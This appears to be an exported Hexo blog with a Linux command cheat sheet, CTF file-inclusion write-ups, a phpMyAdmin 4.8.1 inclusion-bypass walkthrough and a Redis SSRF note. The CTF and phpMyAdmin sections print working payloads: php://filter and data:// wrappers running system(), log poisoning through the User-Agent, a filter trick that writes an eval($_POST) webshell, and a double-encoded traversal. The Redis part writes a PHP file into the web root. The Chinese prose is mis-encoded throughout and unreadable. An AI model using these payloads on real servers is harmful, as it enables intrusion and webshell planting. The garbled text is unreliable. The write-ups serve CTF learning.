<td align="center"><strong>ä¹‹æ›´æ”¹å˜åŠ¨æ—¶é—´</strong></td>
</tr>
<tr>
<td align="center"><strong>-r</strong></td>
<td align="center"><strong>æŠŠåˆ¶å®šæ–‡æ¡£æˆ–ç›®å½•çš„æ—¥æœŸæ—¶é—´ç»Ÿè®¾æˆå’Œå‚è€ƒæ–‡æ¡£æˆ–ç›®å½•æ—¥æœŸæ—¶é—´ç›¸åŒ</strong></td>
</tr>
<tr>
<td align="center"><strong>-t</strong></td>
<td align="center"><strong>ä½¿ç”¨æŒ‡å®šæ—¥æœŸæ—¶é—´ï¼Œè€Œéç°åœ¨çš„æ—¶é—´</strong></td>
</tr>
</tbody></table>
<h4 id="catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹"><a href="#catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹" class="headerlink" title="catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹"></a>catæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„å†…å®¹</h4><table>
<thead>
<tr>
<th align="center"><strong>-b</strong></th>
<th align="center"><strong>å¯¹éç©ºè¾“å‡ºçš„æ‰€æœ‰è¡Œç¼–å·</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>-n</strong></td>
<td align="center"><strong>å¯¹è¾“å‡ºæ‰€æœ‰è¡Œç¼–å·</strong></td>
</tr>
<tr>
<td align="center"><strong>-s</strong></td>
<td align="center"><strong>ä¸è¾“å‡ºå¤šè¡Œç©ºè¡Œ</strong></td>
</tr>
</tbody></table>
<h4 id="lessæŸ¥çœ‹æ–‡ä»¶"><a href="#lessæŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="lessæŸ¥çœ‹æ–‡ä»¶"></a>lessæŸ¥çœ‹æ–‡ä»¶</h4><table>
<thead>
<tr>
<th align="center"><strong>N</strong></th>
<th align="center"><strong>åå‘é‡å¤å‰ä¸€ä¸ªæœç´¢</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>-i</strong></td>
<td align="center"><strong>å¿½ç•¥æœç´¢æ—¶çš„å¤§å°å†™</strong></td>
</tr>
<tr>
<td align="center"><strong>-N</strong></td>
<td align="center"><strong>æ˜¾ç¤ºè¡Œå·</strong></td>
</tr>
<tr>
<td align="center"><strong>/</strong></td>
<td align="center"><strong>å‘ä¸‹æœç´¢å­—ç¬¦ä¸²</strong></td>
</tr>
<tr>
<td align="center"><strong>ï¼Ÿ</strong></td>
<td align="center"><strong>å‘ä¸Šæœç´¢å­—ç¬¦ä¸²</strong></td>
</tr>
<tr>
<td align="center"><strong>n</strong></td>
<td align="center"><strong>é‡å¤å‰ä¸€ä¸ªæœç´ </strong></td>
</tr>
</tbody></table>
<h4 id="åŒ¹é…æŸ¥æ‰¾å‘½ä»¤"><a href="#åŒ¹é…æŸ¥æ‰¾å‘½ä»¤" class="headerlink" title="åŒ¹é…æŸ¥æ‰¾å‘½ä»¤"></a>åŒ¹é…æŸ¥æ‰¾å‘½ä»¤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep</span><br><span class="line">grepå‘½ä»¤æ˜¯ä¸€ç§å¼ºå¤§çš„æ–‡æœ¬æœç´¢å·¥å…·ï¼Œä»–èƒ½ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æœç´¢æ–‡æœ¬ï¼ŒæŠŠåŒ¹é…çš„è¡Œæ‰“å°å‡ºæ¥</span><br></pre></td></tr></table></figure>

<h4 id="findå‘½ä»¤"><a href="#findå‘½ä»¤" class="headerlink" title="findå‘½ä»¤"></a>findå‘½ä»¤</h4><p>find -name</p>
<h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><table>
<thead>
<tr>
<th align="center"><strong>-c</strong></th>
<th align="center"><strong>å»ºç«‹ä¸€ä¸ªå‹ç¼©æ–‡ä»¶çš„å‚æ•°æŒ‡ä»¤</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>-x</strong></td>
<td align="center"><strong>è§£å¼€ä¸€ä¸ªå‹ç¼©æ–‡ä»¶çš„å‚æ•°æŒ‡ä»¤</strong></td>
</tr>
<tr>
<td align="center"><strong>-t</strong></td>
<td align="center"><strong>æŸ¥çœ‹tarfileé‡Œé¢çš„æ–‡ä»¶</strong></td>
</tr>
<tr>
<td align="center"><strong>-z</strong></td>
<td align="center"><strong>æ˜¯å¦åŒæ—¶å…·æœ‰gzipçš„å±æ€§ï¼Œæ˜¯å¦éœ€è¦gzipå‹ç¼©</strong></td>
</tr>
<tr>
<td align="center"><strong>-j</strong></td>
<td align="center"><strong>æ˜¯å¦åŒæ—¶å…·æœ‰bzip2çš„å±æ€§ï¼Œæ˜¯å¦éœ€è¦bzip2å‹ç¼©</strong></td>
</tr>
<tr>
<td align="center"><strong>-v</strong></td>
<td align="center"><strong>å‹ç¼©çš„è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ–‡ä»¶</strong></td>
</tr>
<tr>
<td align="center"><strong>-f</strong></td>
<td align="center"><strong>ä½¿ç”¨æ¡£å</strong></td>
</tr>
<tr>
<td align="center"><strong>-c</strong></td>
<td align="center"><strong>è§£å‹åˆ°æŒ‡å®šç›®å½•</strong></td>
</tr>
</tbody></table>
<h4 id="æƒé™"><a href="#æƒé™" class="headerlink" title="æƒé™"></a>æƒé™</h4><p>chmod è®¾ç½®æ–‡ä»¶çš„è®¿é—®æƒé™<br>+:å‘æƒé™èŒƒå›´å¢åŠ æƒé™ä»£å·æ‰€è¡¨ç¤ºçš„æƒé™<br>-:å‘æƒé™èŒƒå›´å–æ¶ˆæƒé™ä»£å·æ‰€è¡¨ç¤ºçš„æƒé™<br>=:å‘æƒé™èŒƒå›´èµ‹äºˆæƒé™ä»£å·æ‰€è¡¨ç¤ºçš„æƒé™<br>ç”¨æˆ·ç¬¦å·ï¼š<br>uï¼šæ‹¥æœ‰è€…<br>gï¼šæ‹¥æœ‰è€…åŒç»„ç”¨<br>oï¼šå…¶å®ƒç”¨æˆ·<br>aï¼šæ‰€æœ‰ç”¨æˆ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¾‹å­</span><br><span class="line">chmod u+w &#x2F;home&#x2F;abc.txt</span><br><span class="line">chmod o-x &#x2F;home&#x2F;abc.txt</span><br></pre></td></tr></table></figure>

<h4 id="æ¸…å±"><a href="#æ¸…å±" class="headerlink" title="æ¸…å±"></a>æ¸…å±</h4><p>reset</p>
<h1 id="è¡¥å……-æ–‡æ¡£è¯»å–å†…å®¹"><a href="#è¡¥å……-æ–‡æ¡£è¯»å–å†…å®¹" class="headerlink" title="è¡¥å……:æ–‡æ¡£è¯»å–å†…å®¹"></a>è¡¥å……:æ–‡æ¡£è¯»å–å†…å®¹</h1><p>cat\tac\nl\more\less\head\tail\od\fold\fmt\xxd</p>
<ul>
<li>cat ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹(concatenate)</li>
<li>tac ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„å€’è‘—å†™ï¼</li>
<li>nl  æ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºé“è¾“å‡ºè¡Œå·ï¼</li>
<li>more ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</li>
<li><strong>less</strong> ä¸ more ç±»ä¼¼ï¼Œä½†æ˜¯æ¯” more æ›´å¥½çš„æ˜¯ï¼Œä»–å¯ä»¥å¾€å‰ç¿»é¡µï¼</li>
<li>head åªçœ‹å¤´å‡ è¡Œ</li>
<li><strong>tail</strong> åªçœ‹å°¾å·´å‡ è¡Œ</li>
<li>od  ä»¥äºŒè¿›ä½çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹ï¼</li>
</ul>
]]></content>
      <tags>
        <tag>linuxå¸¸ç”¨å‘½ä»¤</tag>
      </tags>
  </entry>
  <entry>
    <title>filecontains</title>
    <url>/2020/09/24/filecontains/</url>
    <content><![CDATA[<h3 id="filecontain"><a href="#filecontain" class="headerlink" title="filecontain"></a>filecontain<a id="more"></a></h3><h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ–‡ä»¶åŒ…å«ï¼Œæ²¡æœ‰ç»™å‡ºå›æ˜¾</p>
<p>å°è¯•ä¼ªåè®®åŒ…å«</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŒ¹é…åˆ°phpå°±ä¼šè¢«æ›¿æ¢ï¼Œè¿™é‡Œå¯ä»¥ç”¨dataåè®®å†™å…¥å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</span></span><br><span class="line">data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span></span><br><span class="line">(attention:åŠ å¯†æœ€å¥½ç”¨æœ¬åœ°å·¥å…·ï¼Œç½‘ä¸ŠåŠ å¯†æœ‰åŒºåˆ«)</span><br></pre></td></tr></table></figure>

<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>dataåè®®ä¹Ÿä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œæƒ³åˆ°å¯èƒ½å¯ä»¥é€šè¿‡å†™å…¥æ—¥å¿—æ–‡ä»¶è¿›è¡ŒåŒ…å«æ¥<code>getshell</code>ï¼ŒburpæŠ“åŒ…ä¿®æ”¹UA</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line">UA:<span class="meta">&lt;?php</span> system(<span class="string">'ls'</span>);<span class="meta">?&gt;</span><span class="comment">//<span class="meta">&lt;?php</span> system('cat fl0g.php');<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<img src="/2020/09/24/filecontains/1.png" class="">

<h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¤šè¿‡æ»¤äº†ä¸ªå†’å·ï¼Œä¸Šé¢˜æ–¹æ³•æ‰“é€š</p>
<h3 id="web82-web86"><a href="#web82-web86" class="headerlink" title="web82-web86"></a>web82-web86</h3><h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    $content = $_POST[<span class="string">'content'</span>];</span><br><span class="line">    $file = str_replace(<span class="string">"php"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"data"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">":"</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">"."</span>, <span class="string">"???"</span>, $file);</span><br><span class="line">    file_put_contents(urldecode($file), <span class="string">"&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?&gt;"</span>.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„çŸ¥è¯†ç‚¹ï¼Œ<code>https://www.leavesongs.com/PENETRATION/php-filter-magic.html</code>ï¼Œå¾ˆè¯¦ç»†</p>
<p>ä½¿ç”¨base64è¿›è¡Œç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/write=convert.base64-decode/resource=xxx.php</span></span><br><span class="line">POST: content=aaPD9waHAgIGV2YWwoJF9QT1NUWzFdKTs%<span class="number">2</span>FPg%<span class="number">3</span>D%<span class="number">3</span>D</span><br><span class="line">è¿›è¡ŒurlåŒç¼–ç </span><br><span class="line">é€šè¿‡base64è¿‡æ»¤ä¹‹åå°±åªæœ‰(phpdie)<span class="number">6</span>ä¸ªå­—ç¬¦æˆ‘ä»¬å°±è¦æ·»åŠ <span class="number">2</span>ä¸ªå­—ç¬¦è®©å‰é¢çš„å¯ä»¥è¿›è¡Œç¼–ç ï¼Œbases64ï¼Œ<span class="number">4</span>ä¸ªå­—ç¬¦ä¸€ç»„</span><br></pre></td></tr></table></figure>

<img src="/2020/09/24/filecontains/2.png" class="">

<p>ä¹‹åå†è®¿é—®å†™å…¥çš„æ–‡ä»¶è·¯å¾„ï¼Œå³å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<img src="/2020/09/24/filecontains/3.png" class="">

<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span>, $file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br></pre></td></tr></table></figure>

<p>ä½œäº†å¾ˆå¤šçš„è¿‡æ»¤ï¼Œä½†æ˜¯å†’å·è¢«æ”¾å‡ºæ¥äº†ï¼Œä¾æ—§å¯ä»¥ç”¨dataåè®®ï¼Œè¿™é‡Œæ³¨æ„åˆ°ç­‰å·è¢«è¿‡æ»¤äº†ï¼ŒåŠ å¯†ä¹‹åçš„å†…å®¹èµ‹å€¼æ—¶å»æ‰ç­‰å·å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw</span></span><br><span class="line">file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTs</span></span><br></pre></td></tr></table></figure>

<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>å¼€é¢˜æ˜¯ä¸ªè§†é¢‘ï¼Œä¸‹è½½ï¼Œforemostæ‹¿åˆ°ä¸€å¼ æºç å›¾ç‰‡</p>
<img src="/2020/09/24/filecontains/4.png" class="">

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i'</span>,$x))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'too young too simple sometimes naive!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">$contents=$_POST[<span class="string">'contents'</span>];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, <span class="string">"&lt;?php die();?&gt;"</span>.$contents);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨å…¶ä»–çš„è¿‡æ»¤å™¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=1.php</span></span><br><span class="line">postï¼šcontents=?&lt;hp pe@av(l_$OPTSQ[tf]m;)&gt;?</span><br><span class="line">    </span><br><span class="line">å†è®¿é—®<span class="number">1.</span>phpï¼Œåˆ©ç”¨shell</span><br><span class="line">Qftm=system(<span class="string">'cat flag.php'</span>);</span><br><span class="line"></span><br><span class="line">é™„ä¸Šæ–‡ç« ï¼šhttps:<span class="comment">//www.anquanke.com/post/id/202510#h3-15</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>show</tag>
      </tags>
  </entry>
  <entry>
    <title>phpmyadmin4.8.1ä»»æ„æ–‡ä»¶åŒ…å«</title>
    <url>/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<p>phpmyadminç®€è¿°ï¼š<a id="more"></a></p>
<p>phpMyAdmin æ˜¯ä¸€ä¸ªä»¥PHPä¸ºåŸºç¡€ï¼Œä»¥Web-Baseæ–¹å¼æ¶æ„åœ¨ç½‘ç«™ä¸»æœºä¸Šçš„MySQLçš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œè®©ç®¡ç†è€…å¯ç”¨Webæ¥å£ç®¡ç†MySQLæ•°æ®åº“ã€‚å€Ÿç”±æ­¤Webæ¥å£å¯ä»¥æˆä¸ºä¸€ä¸ªç®€æ˜“æ–¹å¼è¾“å…¥ç¹æ‚SQLè¯­æ³•çš„è¾ƒä½³é€”å¾„ï¼Œå°¤å…¶è¦å¤„ç†å¤§é‡èµ„æ–™çš„æ±‡å…¥åŠæ±‡å‡ºæ›´ä¸ºæ–¹ä¾¿ã€‚å…¶ä¸­ä¸€ä¸ªæ›´å¤§çš„ä¼˜åŠ¿åœ¨äºç”±äºphpMyAdminè·Ÿå…¶ä»–PHPç¨‹å¼ä¸€æ ·åœ¨ç½‘é¡µæœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œä½†æ˜¯æ‚¨å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨è¿™äº›ç¨‹å¼äº§ç”Ÿçš„HTMLé¡µé¢ï¼Œä¹Ÿå°±æ˜¯äºè¿œç«¯ç®¡ç†MySQLæ•°æ®åº“ï¼Œæ–¹ä¾¿çš„å»ºç«‹ã€ä¿®æ”¹ã€åˆ é™¤æ•°æ®åº“åŠèµ„æ–™è¡¨ã€‚ä¹Ÿå¯å€Ÿç”±phpMyAdminå»ºç«‹å¸¸ç”¨çš„phpè¯­æ³•ï¼Œæ–¹ä¾¿ç¼–å†™ç½‘é¡µæ—¶æ‰€éœ€è¦çš„sqlè¯­æ³•æ­£ç¡®æ€§ã€‚</p>
<p>0x01å½±å“ç‰ˆæœ¬</p>
<p>phpmyadmin4.8.1</p>
<p>0x02æ¼æ´åˆ†æ</p>
<p>ä¸‹é¢çš„å†…å®¹å€Ÿé‰´äº†ChaMd5å®‰å…¨å›¢é˜Ÿçš„æ–‡ç« ï¼Œé™„ä¸Šé“¾æ¥ï¼š<code>https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>â€‹    æ€»çš„æ¥è¯´å‘¢ï¼Œé—®é¢˜å°±å‡ºç°åœ¨è¿™ä¸€å—ä»£ç ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥è¿›è¡Œç»•è¿‡ç™½åå•æ£€æµ‹ï¼Œï¼Ÿä¸¤æ¬¡urlç¼–ç ä¸º%253få°±å¯ä»¥ç»•è¿‡éªŒè¯</p>
<p>0x03ä¾‹é¢˜åˆ†æ</p>
<p>ä¸‹é¢æ˜¯ä¸€é“buuctfä¸Šçš„é¢˜ç›®:warmup</p>
<p>æ‰“å¼€é¢˜ç›®å‡ºç°çš„æ˜¯ä¸€ä¸ªè¡¨æƒ…ï¼Œç›´æ¥æ¥çœ‹ç½‘é¡µçš„æºç ï¼Œå‘ç°äº†æç¤ºæœ‰source.phpçš„æ–‡ä»¶</p>
<img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" class="">

<p>è®¿é—®source.phpï¼Œçœ‹åˆ°äº†æºç </p>
<img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" class="">

<p>åšè¿™é“é¢˜ç›®çš„æ—¶å€™å…¶å®æˆ‘å¹¶ä¸çŸ¥é“è¿™æ˜¯phpmyadmin4.8.1æ¼æ´ï¼Œæ‰€ä»¥å½“æ—¶æ‰¾äº†ä¸€ç¯‡wp</p>
<p>åœ¨å­¦ä¹ äº†è¿™ä¸ªæ¼æ´ä¹‹åï¼Œå¤§æ¦‚å°±æ¸…æ¥šäº†è¿™æ®µä»£ç æ˜¯ä»€ä¹ˆæ„æ€ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œæœ‰æˆ‘åœ¨ä¸Šé¢é™„ä¸Šçš„é‚£æ®µä»£ç ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æ¥æ„é€ payloadäº†ï¼Œå¯¹äº†è¦å…ˆè®¿é—®hint.phpä¼šå¾—åˆ°æç¤ºè¯´</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥ï¼Œpayload:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://efeb72fa-cfeb-4026-8537-6857f5beace4.node3.buuoj.cn/index.php?file=hint.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¾—åˆ°äº†flag:<code>flag{658a2242-c7eb-42fe-8856-76b69e728c0f}</code></p>
]]></content>
      <tags>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>redisé…ç½®åŠSSRFåˆ©ç”¨</title>
    <url>/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>æ˜¨å¤©åšäº†ç½‘é¼æ¯ç„æ­¦ç»„çš„SSRFMEé‚£é“é¢˜ï¼Œå¯¹äºredisçš„åˆ©ç”¨ä¸æ˜¯å¾ˆç†Ÿæ‚‰ï¼Œä»Šå¤©æ­ä¸€ä¸‹ç¯å¢ƒæŠŠèƒ½åˆ©ç”¨çš„æ–¹å¼èƒ½è¿‡ä¸€é<a id="more"></a></p>
<h3 id="å®‰è£…åŠé…ç½®"><a href="#å®‰è£…åŠé…ç½®" class="headerlink" title="å®‰è£…åŠé…ç½®"></a>å®‰è£…åŠé…ç½®</h3><p>ç¬¬ä¸€æ­¥ï¼šè¿›å…¥åˆ°/home/dataç›®å½•ä¸‹</p>
<p>ç¬¬äºŒæ­¥ï¼š wget <a href="http://download.redis.io/releases/redis-3.2.6.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-3.2.6.tar.gz</a>  å®‰è£…å‹ç¼©åŒ…</p>
<p>ç¬¬ä¸‰æ­¥ï¼šè§£å‹ tar -zxvf redis-3.2.6.tar.gz</p>
<p>ç¬¬å››æ­¥ï¼šç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œç¯å¢ƒï¼ˆæ²¡æœ‰gccä¼šæŠ¥é”™ï¼Œå®‰è£…ä¸€ä¸‹gccï¼Œå…¶ä»–æŠ¥é”™å¯å¿½ç•¥ï¼‰</p>
<p>ç¬¬äº”æ­¥ï¼šæ‹·è´redis-cli ã€ redis-server åˆ° /usr/local/redis/ç›®å½•ï¼Œå†å›åˆ°redis-2.6.14 æºç ç›®å½• å°†redis.conf æ–‡ä»¶å¤åˆ¶åˆ° redis ç›®å½•ä¸‹</p>
<p>ç¬¬å…­æ­¥ï¼šä¿®æ”¹redis.confé…ç½®ä¿¡æ¯ï¼Œdaemonize noï¼Œnoæ”¹ä¸ºyesï¼Œprotected=mode yesæ”¹æˆnoï¼Œbind 127.0.0.1æ³¨é‡Šæ‰ï¼Œå…·ä½“ä½œç”¨åœ¨é…ç½®ä¿¡æ¯çš„æ³¨é‡Šä¿¡æ¯ä¸­éƒ½æœ‰</p>
<p>å¼€å¯redisæœåŠ¡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p>å†ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pstree</span><br></pre></td></tr></table></figure>

<p>çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰redisæœåŠ¡åœ¨è¿è¡Œ</p>
<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/1.png" class="">

<h3 id="REDISé…åˆgopheråè®®è¿›è¡ŒSSRF"><a href="#REDISé…åˆgopheråè®®è¿›è¡ŒSSRF" class="headerlink" title="REDISé…åˆgopheråè®®è¿›è¡ŒSSRF"></a>REDISé…åˆgopheråè®®è¿›è¡ŒSSRF</h3><h4 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h4><p>gopheråè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ redisã€ftpç­‰ç­‰ï¼Œä¹Ÿå¯ä»¥å‘é€ GETã€POST è¯·æ±‚</p>
<h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">èƒ½æœªæˆæƒæˆ–è€…èƒ½é€šè¿‡å¼±å£ä»¤è®¤è¯è®¿é—®åˆ°RedisæœåŠ¡å™¨</span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>1.ç»å¯¹è·¯å¾„å†™shell</p>
<p>2.å†™sshå…¬é’¥</p>
<p>3.å†™contrabè®¡åˆ’ä»»åŠ¡åå¼¹shell</p>
<h4 id="ç»å¯¹è·¯å¾„å†™shell"><a href="#ç»å¯¹è·¯å¾„å†™shell" class="headerlink" title="ç»å¯¹è·¯å¾„å†™shell"></a>ç»å¯¹è·¯å¾„å†™shell</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">get webshell</span><br></pre></td></tr></table></figure>

<img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/2.png" class="">

